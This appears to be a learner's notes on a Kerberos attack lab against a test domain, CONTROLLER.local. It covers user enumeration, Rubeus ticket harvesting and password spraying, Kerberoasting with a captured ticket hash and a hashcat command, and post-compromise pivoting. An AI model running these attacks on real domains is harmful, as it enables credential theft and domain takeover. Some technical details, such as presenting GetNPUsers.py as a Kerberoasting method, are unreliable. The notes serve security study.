# Attacking Kerberos
### Task 1 Intro
Covers the topics of:
- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

##### What is Kerberos?
Kerberos is the default authentication service for Microsoft Windows domains. it is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

**Common Terminology -**
- Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain
- Key Distribution Center (KDC) - The KDC is service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service
- Authentication Service (AS) - Issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets
- Ticket Granting Service (TGS) - Takes the TGT and returns a ticket to a machine on the domain.
- Service Principal Name (SPN) - A SPN is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. it is used to encrypt the TGT and sign the PAC.
- Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

**AS-REQ w/ Pre-Authentication In Detail**
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

**Ticket Granting Ticket Contents**
The TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![[Pasted image 20220206170927.png]]

**Service Ticket Contents**
A service ticket contains two portions; the service provided portion and the user-provided portion.
- Service: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
- User: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![[Pasted image 20220206171321.png]]

**Kerberos Authentication Overview**
![](https://i.imgur.com/VRr2B6w.png)

AS-REQ 1) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT)
AS-REP 2) The Key Distribution Center verifies the client and send back an encrypted TGT
TGS-REQ 3) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP 4) The KDC verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client
AP-REQ 5) The client requests the service and sends the valid session key to prove the user has access.
AP-REP 6) The service grants access

**Kerberos Tickets Overview**
The main ticket is a TGT, can come in .kirbi for Rebeus or .ccache for Impacket. A ticket is typically base64 encoded and can be used for various attacks. A kRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

**Attack Privilege Requirements**
- Kerbrute Enumeration - No domain access required
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required
- Silver Ticket - Service hash required
- Skeleton Key - Full domain compromise (domain admin) required

### Task 2 Enumeration w/ Kerbrute
Need to add the DNS domain `<ip> CONTROLLER.local` to hosts file

**Abusing Pre-Authentication Overview**
By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist

```
2022/02/06 17:31:51 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2022/02/06 17:31:51 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2022/02/06 17:31:51 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2022/02/06 17:31:52 >  [+] VALID USERNAME:       user3@CONTROLLER.local

```

Users that are valid on the domain

### Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus
**Harvesting Tickets w/ Rubeus**
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack

1) `cd Downloads` - navigate to the Rubeus directory
2) `Rubeus.exe harvest /interval:30` - Harvest for TGTs every 30 seconds

**Brute-Forcing / Password-Spraying w/ Rubeus**
Can brute passwords as well as password spray user accounts. This attack will take a given Kerberos-based password and spray it against all found useres and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well s to be used in attacks like th pass the ticket attack.

Before password spraying with Rubeus, you need to add the DC domain name to the windows host file.

`echo <ip> CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1) `cd Downloads`
2) `Rubeus.exe brute /password:Password1 /noticket`

### Task 4 Kerberoasting w/ Rubeus & Impacket
This task includes one of the most popular Kerberos attacks - Kerberoasting. This allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BlooHound to find all Kerberoastable acounts.

`Rubeus.exe kerberoast` will find the users that can be kerberoasted.

Copy the hash over to the attacker machine and crack it using hashcat
```
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca l:30111*$4139FEEF60FCBBEAD950CE3B6E8A0AEB$DFABE438A1B05565F5AE15DB247B93B4B9BE31 ED2D8CBA5B598A254A52509239DDA33DC61E461ADBC75929C0B59821D80C40A13E4C78132C7C2F98 597EB899D2704F63CF0A6DC4E9E5754BDE27F93EBE67106DD8A2FE7C5086FE3784E16E59EE2EAB91 717D516C4D97ECDE3A2265F1A8AFD0EC3D6065EBE43BDB82E0ED052286EB210A281C269F35C61A19 148BA3517DBF74E6A0797EB783CD613DF6078077FE032E550890B7E371154BA092DC717118E8BEFA 091648F91AABF1A1025C876F96452A3953A2A356152A1C6D212CB95BA1C445AC8DDD5EBB2563AC08 1870DDCB0413160DFC6025EE188F33E1445110754636AA6B317963BC3A92846EC10126BB6A356482 6FDD497DCFA4BC20773E4BE92D7E280EF093AF71A0F9A5C3265F26E8EB3DA4ABA4D7330C457EA93A 69702D6BF5549CA67793835E7A3AB1F70B1D1A8801FA6A3FD39558CD7DC7E562A39B53716D3DEE63 3AF5D6FE11A9C7A9BDBA58524067FEFE5FF82BC512E2BA2F8A05423ADE5BA626ABCA21153D213C35 3E99DB61BD72C698B8FA2DFAD6A420915D346CB59EC05058AEF1A0F365ACF4D8C6C9A38BEFE394BA FF798E391DDF7FEF7892882778181DAB729EDEC8A87DC7B93764C5AE6A28AE9F45D1D4C836A06A44 21586D8B2F49DD4D784C374A4484C9E51E062859A6D763C4CA066C33A04DF1639D1D1F73CAA847FB 2D7EDF85E50A390584874E7F67D44479FCCA90426FEE0B8971743EA239F82B46172D455B0560D49C 5A7F8A1F3BBD637203C9F83BA2C088CE9F68BAD99E1D7B7527856804AF55D982F807038105AA3EE6 D292BF07F8DBEC1B79F1FDDBC7806194DC87D43D7A2EADC54631499A96B119787CD768ABDF577DE1 AA9E4E602B2D4ED42A88886E77D76D45A2F83336309BC8FCC15CB859BB1B328D909813F3E19D5716 A6E1B16FFC4849C19066720E3871DAB5C865BABF5AB71CBF38CE5ED1ABC5E0BC819AFE24BCF37E5A DFD0B12E7FB140D0EB646B527002E3C45F7CD79E3354094F91CD02D14669E917D1D148B844B1699F 56D9B1931B532C277DA13E199E3B4EF3AF03768544D64516A5E7644D186005D78BDE3A8505DD2B47 F8E4A1386BD82B6E9513C2554007D324EC073207867193A4ECACFD02BBA6806E4A5170DDC93C7764 FBA6E7B2E7D441E717BC677990B67903DB5DFC3E185DE61616C6CA488332AC52FEA15A6795DF1151 61A802DD80D510902CDA1C3E577E925DDBB29F9176EAC3543877044BDCDCB2262A31185B601BC518 D4E9BD903D9BA8AB7AF5F15B71B227F5622261B0D595B54FE49640FBBECBCE7C07A033377EAEE358 9553623447ECFEAFEF34C0F2E5D32FF1DA01B24B75F21140D247C1019660DF4041930F08DF143FA9 0B1E70D5165040B82BC4018D3F24C9AC2079849649263E28D842BDE807534728135CF4D2468486B5 3018CD2AD739DC7EC1D2F8351B4C36E23FAA79195ADFA9E7FCF7C1D8C73A1353033F9C107A8748EE 30D1CF3A212235D5092547A6D0844EBD21A7CDA3D31086AEFB6BC383BDA07F63C57320E8E5878872 54BBEB12B30E6A0D8CFB29854ED14F37D8CC1A3F739F4E6762ADF130C850EF45CAA2F3F19E9039C4 20ADBAD98D061F5365CFC481ABB60F418D168FBF4920492C24DA7C06EE
```

`hashcat -m 13100 -a 0 hash.txt pass.txt`

Password of the SQLService account -> ``

##### Method 2 Impacket
`python3 GetNPUsers.py <domain>/<user>:<password> -dc-ip <ip> -request`

Can be done remotely without having to be on the machine, like Rubeus requires.

##### What can a service account do?
After cracking the service account passowrd there are varous ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log on to other systems and pivot or escalate or you can use that cracked password to spray against other service and domaina dmin companies.

##### Kerberoasting mitigation
- Strong service passwords
- Don't make service accounts domain admins




``